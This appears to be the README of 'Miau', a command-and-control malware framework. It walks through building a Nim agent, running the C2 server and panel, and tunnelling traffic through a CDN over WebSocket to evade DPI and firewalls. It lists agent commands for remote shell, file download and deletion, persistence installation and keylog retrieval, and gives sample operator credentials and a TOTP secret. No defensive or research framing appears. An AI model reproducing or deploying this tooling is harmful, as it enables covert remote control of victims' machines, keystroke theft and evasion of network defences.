# Miau C2 Framework

## Overview

Miau is a remote administration tool with encrypted C2 communication, domain fronting tunneling, and web-based management panel.

## Architecture

```
Agent (Nim) --TCP+TLS--> Backend (Python) <--HTTP--> Panel (HTML)
                    \                             /
                     ----WebSocket (DCT)--------
```

### Components

| Component | Path | Purpose |
|-----------|------|---------|
| Backend | `backend/` | C2 server, REST API, WebSocket tunnel |
| Client | `client/nim/` | Agent written in Nim |
| Builder | `builder/` | Build script for agent compilation |
| Panel | `panel/` | Web management interface |
| Proto | `proto/` | Protobuf message definitions |

## Requirements

### Backend
- Python 3.10+
- Nim crypto libraries

### Agent
- Nim 2.0+
- OpenSSL 3.x
- Nimcrypto package

## Quick Start

### 1. Install Dependencies

**Backend (Windows):**
```powershell
cd backend
pip install -r requirements.txt
```

**Nim + OpenSSL (Windows via WinGet):**
```powershell
winget install nim.nim
winget install BrechtSanders.WinLibs.MCF.UCRT
```

**Nimcrypto:**
```powershell
nimble install nimcrypto@0.7.3
```

### 2. Generate TLS Certificate

```powershell
cd backend
python gen_cert.py
```

This creates:
- `certs/server.crt` - TLS certificate
- `certs/server.key` - Private key
- `certs/server.der` - DER format for pinning
- `certs/fingerprint.txt` - SHA256 pin for agent

### 3. Generate Agent Token

```powershell
cd backend
python keygen.py --label "client-1" --count 1
```

Output format: `<token> <aes_key_hex> <label>`

Example:
```
miau_ITkN2mWGRu7nxuBabAtaKsVxOeQx3Y5i 2efdec9ea5473288cf4e73bae7f8edfcb585801064498bbae67dcd5f9c2e4461 client-1
```

### 4. Build Agent

```powershell
cd builder
.\build_agent.ps1 -Token "miau_..." -AesKeyHex "..." -Pin "B8EF601F4FAD16BDB97431D26554A435EFF971F516DE579D1D8267E31F549963" -Host "127.0.0.1" -Port 9000
```

Parameters:
- `-Token` - Token from keygen
- `-AesKeyHex` - AES key from keygen
- `-Pin` - Certificate fingerprint
- `-Host` - C2 server IP
- `-Port` - C2 server port (default 9000)

### 5. Start Backend

```powershell
cd backend
python run.py --port 9000 --api-port 8080
```

Options:
- `--port` - TCP port for agent connections (default 9000)
- `--api-port` - HTTP port for panel (default 8443)
- `--no-rest` - Run listener only, no API

### 6. Access Panel

Open browser: `http://localhost:8080/`

Login credentials:
- Password: `miau` (from config.toml)
- TOTP: Use current code

**TOTP Setup:**
- Secret: `JVUWC5KQMFXGK3A`
- Digits: 6
- Interval: 30 seconds
- Issuer: MiauPanel

Use any TOTP app (Google Authenticator, Aegis, etc.)

## Configuration

### config.toml

```toml
[server]
host = "0.0.0.0"
tcp_port = 9000
api_port = 8443
hb_interval = 15
hb_timeout = 60

[tls]
cert_dir = "./certs"
common_name = "miau-relay"
org = "Miau"
country = "NL"
valid_days = 3650
rsa_bits = 4096

[auth]
operator_password = "miau"
totp_issuer = "MiauPanel"

[store]
db_path = "./miau.db"
```

## DCT - Domain C2 Tunneling

DCT routes C2 traffic through WebSocket to bypass DPI/firewalls. Traffic appears as ordinary HTTPS/WSS.

### How it works

1. Agent connects to `wss://cdn-domain/dct/{token}`
2. CDN proxies WebSocket to backend
3. Backend upgrades to WebSocket and pipes frames

### Setup with Nginx + Cloudflare

**Nginx config:**
```nginx
server {
    listen 443 ssl;
    server_name your-domain.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location /dct/ {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_read_timeout 86400;
    }
}
```

**Cloudflare:**
1. Add A record pointing to your server IP
2. Enable proxy (orange cloud)
3. SSL/TLS mode: Full (strict)

## API Reference

### Authentication
All API endpoints (except / and /api/auth/login) require headers:
- `X-Panel-Pw`: operator password
- `X-Panel-Totp`: current TOTP code

### Endpoints

| Method | Path | Description |
|--------|------|-------------|
| POST | /api/auth/login | Login with password + TOTP |
| GET | /api/health | Health check |
| GET | /api/clients | List all clients |
| GET | /api/client/{id} | Client details |
| POST | /api/client/{id}/cmd | Send command |
| GET | /api/command/{id}/resp | Get command response |
| GET | /api/stats | Dashboard statistics |
| GET | /api/tokens | List tokens |
| POST | /api/tokens | Create new token |
| POST | /api/tokens/{token}/revoke | Revoke token |
| GET | /api/keylogs/{token} | Get keylogs |
| GET | /api/modules | List modules |
| POST | /api/modules | Upload module |

### Commands

| Command | Description |
|---------|-------------|
| shell | Execute shell command |
| file_list | List directory contents |
| file_download | Read file (base64) |
| file_write | Write file (path\|base64) |
| file_delete | Delete file/directory |
| process_list | List processes |
| process_kill | Kill process by PID |
| net_list | Network connections |
| sysinfo | System information |
| ping | Ping agent |
| persist_install | Install persistence |
| persist_remove | Remove persistence |
| uninstall | Uninstall agent |

## File Structure

```
Miau/
├── backend/
│   ├── run.py           # Main entry point
│   ├── listener.py      # TCP+TLS listener
│   ├── api.py           # REST API + panel server
│   ├── dct_tunnel.py    # WebSocket DCT tunnel
│   ├── store.py         # SQLite database
│   ├── codec.py         # AES-256-GCM frame codec
│   ├── config.py        # Configuration loader
│   ├── keygen.py        # Token generator
│   ├── gen_cert.py      # Certificate generator
│   ├── certs/           # TLS certificates
│   └── miau.db          # SQLite database
├── client/
│   └── nim/
│       ├── agent.nim    # Agent main loop
│       ├── commands.nim # Command implementations
│       ├── transport.nim # TLS transport
│       ├── dct_transport.nim # WebSocket transport
│       ├── miau_codec.nim # Protobuf codec
│       ├── ca_embedded.nim # Embedded CA cert
│       ├── persistence.nim # Auto-start persistence
│       └── miau_config.nim # Build-time config
├── builder/
│   └── build_agent.ps1  # Build script
├── panel/
│   └── panel.html       # Web panel
└── proto/
    ├── messages.proto   # Message definitions
    └── enums.proto      # Enum definitions
```

## Security Notes

- All C2 traffic is AES-256-GCM encrypted
- Certificate pinning prevents MITM
- PSK for initial auth handshake
- Per-agent unique AES-256 keys
- TOTP required for panel access

## Troubleshooting

**Agent fails to connect:**
1. Check server is running: `netstat -an | findstr 9000`
2. Verify TLS certificate exists
3. Check agent logs: `agent_stderr.log`
4. Verify token exists in database

**Panel login fails:**
1. Get current TOTP code
2. Check password in config.toml
3. Verify API is running

**DCT not working:**
1. Check WebSocket support in CDN config
2. Verify firewall allows port 443
3. Test direct WebSocket connection

## Build from Source

### Compile protobuf (if modified)
```powershell
cd proto
protoc --python_out=../backend --nim_out=../client/nim messages.proto enums.proto
```

### Build agent manually
```powershell
cd client/nim
nim c -d:ssl -d:useOpenssl3 -d:ServerAddr=HOST -d:ServerPort=PORT -d:AgentToken=TOKEN -d:AgentAesKey=KEY -d:ServerPin=PIN agent.nim
```

## Version

Miau v1.0.0
DCT Module v1.0
Panel v1.0
